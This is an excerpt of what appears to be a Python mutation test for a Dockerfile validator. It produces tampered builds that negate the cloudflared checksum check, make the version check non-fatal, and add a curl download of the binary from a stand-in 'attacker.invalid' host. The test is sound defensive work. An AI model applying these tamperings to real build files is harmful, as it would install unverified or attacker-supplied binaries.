...
cloud_check = 'echo "${CLOUDFLARED_SHA256}  cloudflared" | sha256sum -c -'
...
mutations = {
    "negated checksum": dockerfile.replace(cloud_check, "! " + cloud_check, 1),
    "nonfatal OR fallback": dockerfile.replace(
        "cloudflared --version", 'cloudflared --version || echo "ignored"', 1
    ),
    "literal OR true": dockerfile.replace(
        "cloudflared --version", "cloudflared --version || true", 1
    ),
    ...
    "additional unapproved curl": dockerfile.replace(
        ...
        '-o /usr/local/bin/cloudflared "https://attacker.invalid/cloudflared"',
        1,
    ),
